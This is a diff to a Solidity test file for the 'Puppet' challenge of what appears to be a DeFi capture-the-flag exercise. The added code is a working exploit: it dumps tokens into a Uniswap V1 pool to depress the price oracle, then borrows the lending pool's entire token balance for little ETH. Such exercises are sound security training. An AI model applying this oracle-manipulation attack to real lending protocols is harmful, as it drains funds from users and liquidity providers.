@@ -23,6 +23,9 @@ interface UniswapV1Exchange {
         external
         view
         returns (uint256);
+    
+    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
+
 }
 
 interface UniswapV1Factory {
@@ -113,12 +116,26 @@ contract Puppet is DSTest, stdCheats {
             POOL_INITIAL_TOKEN_BALANCE * 2
         );
 
+        
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapExchange), 2 ** 256 - 1);
 
+
+        uint ethGained = uniswapExchange.tokenToEthSwapInput(1000e18, 1, DEADLINE);
+        // console.log(ethGained);
+        // console.log(attacker.balance);
+
+        uint ETHneed = puppetPool.calculateDepositRequired( dvt.balanceOf(address(puppetPool))  );
+        
+        puppetPool.borrow{value: ETHneed}( dvt.balanceOf(address(puppetPool)) );
+
+    
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
